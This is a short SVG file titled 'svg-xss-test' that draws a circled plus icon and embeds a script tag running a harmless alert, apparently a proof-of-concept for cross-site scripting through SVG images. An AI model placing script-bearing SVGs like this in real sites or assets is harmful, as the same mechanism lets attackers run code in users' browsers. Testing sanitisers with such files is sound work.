# svg-xss-test

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
<script type="text/javascript">
  alert("Hello, I'm in ;)");
</script>
<path d="M256 48C141.1 48 48 141.1 48 256s93.1 208 208 208 208-93.1 208-208S370.9 48 256 48zm0 398.7c-105.1 0-190.7-85.5-190.7-190.7S150.9 65.3 256 65.3 446.7 150.9 446.7 256 361.1 446.7 256 446.7z"/><path d="M264 128h-16v120H128v16h120v120h16V264h120v-16H264z"/></svg>
